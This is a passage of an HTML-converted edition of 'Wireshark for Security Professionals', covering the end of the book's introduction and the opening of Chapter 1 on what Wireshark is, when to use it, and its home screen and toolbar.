single;font-size:15.0000pt;" >Chapter 3</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >acts as a refresher for what&#8217;s necessary around networking, information security, and packet and protocol analysis.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Further in the book, Wireshark is used in the context of various roles, but there&#8217;s no experience requirement for grasping the content or making use of the labs. For example, the tools used in </span><span><a href="#_bookmark455" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 6</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, &#8220;Offensive Wireshark&#8221; might be already familiar to the penetration tester, but the chapter assumes zero experience when instructing setup.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:10.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To sum up, we understand there is a wide spectrum of possible roles and experience levels. You might be employed in one of these roles and want to use Wireshark more. Or you might be getting ready to take on one of these roles, and recognize Wireshark as essential tool to use. In either case, this book is for you.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="Tools You Will Need" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark10" ></a>Tools You Will Need</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The one tool required for this book is a system. Your system does not need to be especially powerful; at the most a few years old would be best. Your system will be first used in </span><span><a href="#_bookmark56" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 2</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, &#8220;Setting Up the Lab.&#8221; You first install and set up a virtualized machine. Then upon that virtual machine you will set up the labs.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Of course, this book can benefit those without a system, but a system</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section17" ><p class=MsoBodyText  style="margin-top:3.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is needed to perform the labs referenced throughout the book.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="_bookmark11" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="What¡¯s on the Website" ></a>What&#8217;s on the Website</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The primary website needed for this book is the GitHub repository for the W4SP Lab code. The GitHub repo and its contents are explained further in </span><span><a href="#_bookmark56" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 2</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, &#8220;Setting Up the Lab,&#8221; where you first download and build the virtual lab environment. Then the Lab files are installed onto your virtual machine.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Other websites are cited throughout the book, mostly as pointers for additional resources. For example, some sites hold hundreds of network capture files that are available for analysis.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="Summary" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark12" ></a>Summary</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.1000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This is where the authors are at the edge of our seats, hoping you will leap into and enjoy the book, its materials, and the labs. A lot of thought and effort went into this book. Our only desire was to create a resource that inspired more people to have a deeper appreciation of Wireshark. Being information security professionals ourselves, we crafted this book for our peers.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section18" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></p><h1><a name="_bookmark14" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><a name="_bookmark13" ></a><a name="Chapter 1: Introducing Wireshark" ></a>Chapter 1</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></h1><p class=MsoNormal  style="margin-top:0.3500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><b><span style="mso-spacerun:'yes';font-family:Arial;mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:24.5000pt;" >Introducing Wireshark</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></p><p class=MsoNormal  style="margin-top:15.5500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Welcome to </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >Wireshark for Security Professionals</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. This introductory chapter covers three broad topics. In the first part, we discuss what Wireshark is used for and when to use it.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The second part of this chapter introduces the popular graphic user interface (GUI). The GUI for Wireshark can appear quite busy at first, so we immediately want to get familiar with its layout. We break down the different areas of the interface, how they relate to one another, and the reasoning for needing each one. We also discuss how and when each part of the interface helps you maximize your use of Wireshark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:9.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In the third part of this chapter, we discuss the way Wireshark filters data presented on the interface. Being familiar with Wireshark&#8217;s interface helps you appreciate all the data presented, but the amount of data can still be overpowering. Wireshark offers ways to filter or separate what you need from all that is presented. The last part is about different types of filters and how you can customize these filters.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark can appear to be a complicated tool, but by the end of this first chapter, the hope is you have a much higher comfort level with the tool&#8217;s purpose, interface, and ability to present you with what you want to see.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:0.0500pt;" ><a name="_bookmark15" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="What Is Wireshark?" ></a>What Is Wireshark?</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><a name="_bookmark16" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark, in its most basic sense, is a tool to understand data you capture from a network. The captured data is interpreted and presented in individual packet form for analysis, all within Wireshark. As you probably already know, </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >packets </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >are the chunks of data streaming on a network. (Technically, depending on the context level of where in the system the data is interpreted, chunks are called </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >frames</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >datagrams</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >packets</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, or </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >segments</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, but we&#8217;ll just use &#8220;packets&#8221; for now.) Wireshark is a network and protocol analyzer tool, free for</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section19" ><p class=MsoBodyText  style="margin-top:3.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >download and use on a variety of platforms, spanning many flavors of Unix and Windows.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:8.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark first captures the data from a network interface and then breaks the capture into the frames, segments, and packets, understanding where they begin and end. Wireshark then interprets and presents this data in the context of addressing, protocols and data. You can analyze the captures immediately or save them to load later and share with others. In order for Wireshark to view and capture all packets, not just those involving the capturing system, the network interface is placed in </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >promiscuous mode </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(also called </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >monitor mode</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >) in the context of capturing on a wireless network. Finally, what grants you the ability to analyze packets in Wireshark are the </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >dissectors</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. All these basic elements are discussed in more detail in </span><span><a href="#_bookmark237" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 4</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, in the context of &#8220;sniffing&#8221; or capturing data, and how that captured data is interpreted.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:13.5000pt;" ><o:p>&nbsp;</o:p></span></p><h2><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >A Best Time to Use Wireshark?</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark is an immensely powerful tool with quite a bit of deep and complex functionality. It is capable of handling a wide range of known (and unknown) protocols. But although the functionality range is broad, most of it aligns to one end: to capture packets and analyze them. Being able to take the bits and bytes and present them in an organized, familiar, and human-readable format is what brings people to think of using Wireshark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Before launching Wireshark, it&#8217;s important to understand when to use it and when not to use it. Sure, it&#8217;s a great tool, but like any tool, it&#8217;s best used when it&#8217;s the right tool for the job.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:129.8000pt;margin-left:30.5000pt;text-indent:-22.5000pt;line-height:145%;" ><span style="position:absolute;z-index:-1;margin-left:133.0833px;margin-top:64.9167px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker28916.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Here are scenarios when it&#8217;s ideal to use Wireshark: To look for the root cause of a known problem</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:52.5000pt;margin-left:30.5000pt;line-height:145%;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:11.1667px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker29016.png" ></span><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:52.4167px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker29017.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To search for a certain protocol or stream between devices To analyze specific timing, protocol flags, or bits on the wire</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >And while not ideal, Wireshark can also be used:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.8333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker29190.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To discover which devices or protocols are the top talkers</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section20" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:17.2500px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker29251.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To see a rough picture of network traffic</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.8333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker29294.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To follow a conversation between two devices</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:9.3500pt;" ><a name="_bookmark17" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You get the idea. Wireshark is ideal for determining a root cause of an understood problem. While not ideal for browsing network traffic or making high-level judgments about the network, Wireshark does have some features to show those statistics. But Wireshark can&#8217;t and shouldn&#8217;t be the first tool thought of early on in discovering a</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >problem. Someone who opens Wireshark to skim through the list of packets to assess network health would soon be overwhelmed. Instead, Wireshark is for problem solvers, for the detectives who already know their suspects</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >well.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.3000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Avoiding Being Overwhelmed</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The majority of people who walk away from Wireshark do so because they find it overwhelming after only a few early experiences. To label Wireshark as overwhelming is misleading, however. What really paralyzes new users is the traffic, the list of packets flying by, </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >not </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >the application&#8217;s functionality. And, fair enough, once you start a capture and the packets scroll by in real time, it&#8217;s definitely intimidating. (But that&#8217;s what filters are for!)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To avoid being overwhelmed, consider two aspects of Wireshark</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.2000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >before </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >diving into it:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:7.7000pt;margin-right:0.0000pt;margin-left:30.5000pt;text-indent:0.0000pt;text-align:left;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.8333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker30464.png" ></span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >The interface</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#8212;how it&#8217;s laid out and why</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.8333px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker30505.png" ></span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >Filters</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#8212;how they work to reveal what you want</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Once you get a quick appreciation of the tool&#8217;s interface and how to write a filter, Wireshark suddenly appears intuitive and shows its power, without the scare factor. And that&#8217;s what we focus on for the rest of this chapter.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:8.4500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The following sections are on the most important aspects that you need immediately to be comfortable using Wireshark. If you are already familiar with Wireshark, as well as filters, feel free to skim this chapter as a refresher so that you can be sure you are on the same</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >page for the rest of the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.3000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >book.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section21" ><h2 style="margin-top:3.7000pt;" ><a name="_bookmark18" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="The Wireshark User Interface" ></a>The Wireshark User Interface</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We start with the busy Wireshark GUI, which is packed with features. We provide a high-level overview of where you need to look to start seeing some packet data. With packet capturing covered, we then discuss the more powerful features of Wireshark, starting with dissectors. In Wireshark, </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >dissectors </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >are what parse a protocol and decode it for presenting on the interface. They enable Wireshark to give the raw bits and bytes streaming across the wire some context by displaying them into something more meaningful to the human analyst. We then round off the chapter by covering the various filters available to help limit and zero in on just the network data you are interested in.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The home screen appears when you open Wireshark. On this screen are shortcuts you can use to start a new capture or open a previous capture file. <a name="_bookmark19" ></a>For most newcomers to Wireshark, the brightly colored Capture button is the most attractive option. Starting a capture leads to a flurry of scrolling packets, which for the newcomer then leads to overwhelm. But let&#8217;s go back to the home screen. There are also links to online documentation that you can use to figure out how to accomplish a certain task.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:9.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >On the top of the screen, as shown in<a name="_bookmark20" ></a>&nbsp;</span><span><a href="#_bookmark21" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-1</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, is the menu bar in the classic format you are probably familiar with. These menus have settings and other features like statistics that can be accessed when needed. (Don&#8217;t worry&#8212;we aren&#8217;t really worried about statistics.)</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Below these menus is the Main toolbar, which has quick access icons for the functionality you will use most while analyzing network traffic. These icons include things like starting or stopping a capture, and the various navigation buttons for finding your way around captured packets. Icon buttons are typically grayed if not applicable or usable&#8212; for example, without a capture</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.3500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >yet.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section22" ><p class=MsoBodyText ><img width="779"  height="555"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker32986.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark21" ></a><span><a href="#_bookmark20" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 1-1:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >The Wireshark home screen</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:9.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Icons change over time from version to version. At the time this book was written, the blue shark fin starts a capture and the red square stops a capture. The shark fin is gray until the network interface is chosen, and we cover that soon. Also note that this toolbar area gives you a visual indication of the capture process. Again, many options are grayed out in 